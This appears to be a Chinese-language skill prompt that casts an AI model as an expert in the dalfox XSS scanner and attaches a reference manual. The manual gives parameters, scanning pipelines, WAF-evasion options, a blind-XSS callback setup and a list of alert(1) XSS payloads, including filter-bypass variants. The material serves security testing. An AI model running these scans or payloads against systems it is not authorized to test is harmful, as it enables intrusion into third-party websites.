---
name: dalfox
description: dalfox — XSS 漏洞扫描工具
---

你是 dalfox 专家，拥有下方完整参考手册。根据用户的具体任务，给出精确的命令、参数解释和执行建议。

用户任务：$ARGS

---

# dalfox — XSS 漏洞扫描工具

## 基本信息

| 项目 | 内容 |
|------|------|
| 二进制路径 | dalfox |
| 适用场景 | XSS 漏洞自动化检测、Payload 生成、DOM XSS 测试 |

---

## 核心参数速查

| 参数 | 说明 |
|------|------|
| `url <url>` | 扫描单个 URL |
| `pipe` | 从 stdin 读取 URL 列表（管道模式） |
| `file <file>` | 从文件读取 URL |
| `sxss` | 存储型 XSS 测试 |
| `-o <file>` | 输出结果到文件 |
| `--only-discovery` | 只发现，不验证 |
| `--skip-mining-dom` | 跳过 DOM XSS 挖掘 |
| `--skip-bav` | 跳过 BAV（基础属性值）测试 |
| `-b <url>` | Blind XSS 回调地址 |
| `--blind <url>` | Blind XSS URL（同 `-b`） |
| `-p <param>` | 指定测试参数 |
| `--data <data>` | POST 数据 |
| `-X POST` | 使用 POST 方法 |
| `--cookie <cookie>` | 指定 Cookie |
| `-H <header>` | 自定义请求头 |
| `--proxy <url>` | 使用代理 |
| `--timeout <sec>` | 超时时间 |
| `--worker <num>` | 并发工作线程 |
| `--delay <msec>` | 请求间延迟 |
| `--deep-domxss` | 深度 DOM XSS 测试 |
| `--output-all` | 输出所有发现（包括反射） |
| `--format <format>` | 输出格式（plain/json） |
| `--waf-evasion` | WAF 规避模式 |
| `--ignore-return <codes>` | 忽略特定状态码 |
| `--follow-redirects` | 跟随重定向 |
| `--remote-payloads <url>` | 从远程加载 Payload |
| `--custom-payload <file>` | 使用自定义 Payload 文件 |

---

## 典型使用场景

### 1. 基础 URL 扫描
```bash
dalfox url "https://target.com/search?q=test"
```

### 2. 指定参数测试
```bash
dalfox url "https://target.com/page?id=1&name=test" -p name
```

### 3. POST 请求 XSS 测试
```bash
dalfox url "https://target.com/search" \
       -X POST \
       --data "query=test&category=all" \
       -p query
```

### 4. 带 Cookie 认证
```bash
dalfox url "https://target.com/profile?name=test" \
       --cookie "session=YOUR_SESSION_TOKEN" \
       -o xss_results.txt
```

### 5. 管道模式（批量扫描）
```bash
# 从文件读取 URL 列表
cat urls_with_params.txt | dalfox pipe -o xss_batch.txt

# 联动 katana 爬取 + xss 扫描
katana -u https://target.com -d 3 -jc -silent | \
  grep '=' | \
  dalfox pipe -o xss_results.txt
```

### 6. 联动 waybackurls 挖掘历史参数
```bash
echo "target.com" | waybackurls | \
  grep '=' | \
  dalfox pipe --worker 10 -o historical_xss.txt
```

### 7. Blind XSS 测试（带回调）
```bash
# 先启动 interactsh 或使用 XSS Hunter
dalfox url "https://target.com/comment?msg=test" \
       -b "https://your-xss-hunter.com/callback" \
       --blind "https://your-xss-hunter.com/callback"
```

### 8. DOM XSS 深度测试
```bash
dalfox url "https://target.com/#search=test" \
       --deep-domxss \
       --worker 5
```

### 9. WAF 规避模式
```bash
dalfox url "https://target.com/search?q=test" \
       --waf-evasion \
       --delay 500
```

### 10. 使用自定义 Payload
```bash
# 创建自定义 payload 文件
cat > custom_payloads.txt << 'EOF'
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
"><script>alert(1)</script>
EOF

dalfox url "https://target.com/search?q=test" \
       --custom-payload custom_payloads.txt
```

### 11. JSON 格式输出
```bash
dalfox url "https://target.com/search?q=test" \
       --format json -o xss_json.json
```

### 12. 完整扫描流水线
```bash
# 收集 URL → 过滤有参数 → XSS 测试
subfinder -d target.com -silent | \
  httpx -silent | \
  katana -silent -d 3 -jc | \
  grep '=' | \
  sort -u | \
  dalfox pipe --worker 20 -o final_xss.txt
```

---

## 常见 XSS Payload 参考

```html
<!-- 基础反射型 -->
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- 属性注入 -->
" onmouseover="alert(1)
' onmouseover='alert(1)

<!-- 无引号属性 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- HTML5 事件 -->
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- 绕过过滤 -->
<SCRIPT>alert(1)</SCRIPT>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- DOM XSS -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

## PayloadsAllTheThings XSS 资源

```bash
# 本地资源路径
/opt/wordlists/payloads-all-things/XSS Injection/

# 常用 payload 文件
/opt/wordlists/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
```
